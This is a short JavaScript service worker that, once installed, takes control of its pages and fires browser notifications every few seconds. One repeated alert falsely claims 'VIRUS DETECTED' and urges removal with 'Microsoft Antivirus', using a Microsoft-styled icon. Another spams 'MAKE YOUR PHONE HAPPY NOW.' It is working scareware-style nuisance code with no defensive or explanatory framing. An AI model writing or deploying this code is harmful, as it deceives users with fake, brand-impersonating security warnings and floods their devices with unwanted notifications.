self.addEventListener("install", () => self.skipWaiting());

self.addEventListener("activate", (event) => {
  event.waitUntil(self.clients.claim());
});

setInterval(() => {
  self.registration.showNotification("Remove Threats Now!", {
    body: "VIRUS DETECTED. REMOVE THREATS NOW WITH MICROSOFT ANTIVIRUS",
    icon: "https://cdn.glitch.global/cbb58682-7814-4e21-a791-7965cc901a5b/Microsoft%20Antivirus.png",
  });
  self.registration.showNotification("Make your phone happy.", {
    body: "MAKE YOUR PHONE HAPPY NOW. IT IS VERY IMPORTANT. MAKE PHONE HAPPY NOW.",
    icon: "https://cdn.glitch.global/cbb58682-7814-4e21-a791-7965cc901a5b/OpuaYT.webp",
  });
}, 1500);

setInterval(() => {
  self.registration.showNotification("Make your phone happy.", {
    body: "MAKE YOUR PHONE HAPPY NOW. IT IS VERY IMPORTANT. MAKE PHONE HAPPY NOW.",
    icon: "https://cdn.glitch.global/cbb58682-7814-4e21-a791-7965cc901a5b/OpuaYT.webp",
  });
}, 4000);